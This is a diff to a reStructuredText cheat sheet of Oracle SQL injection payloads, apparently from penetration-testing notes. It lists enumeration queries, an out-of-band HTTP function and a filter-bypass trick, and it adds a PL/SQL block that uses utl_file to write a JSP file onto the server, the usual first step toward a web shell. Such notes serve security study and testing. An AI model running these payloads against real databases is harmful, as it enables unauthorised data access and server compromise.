@@ -1,6 +1,8 @@
 Oracle Payload
-=====================================
+========================================
 
+常见Payload
+----------------------------------------
 - dump
     - ``select * from v$tablespace;``
     - ``select * from user_tables;``
@@ -32,3 +34,18 @@ Oracle Payload
     - ``HTTP_URITYPE.GETCLOB``
 - 绕过
     - ``rawtohex``
+
+写文件
+----------------------------------------
+.. code-block:: sql
+
+    create or replace directory TEST_DIR as '/path/to/dir';
+    grant read, write on directory TEST_DIR to system;
+    declare
+       isto_file utl_file.file_type;
+    begin
+       isto_file := utl_file.fopen('TEST_DIR', 'test.jsp', 'W');
+       utl_file.put_line(isto_file, '<% out.println("test"); %>');
+       utl_file.fflush(isto_file);
+       utl_file.fclose(isto_file);
+    end;
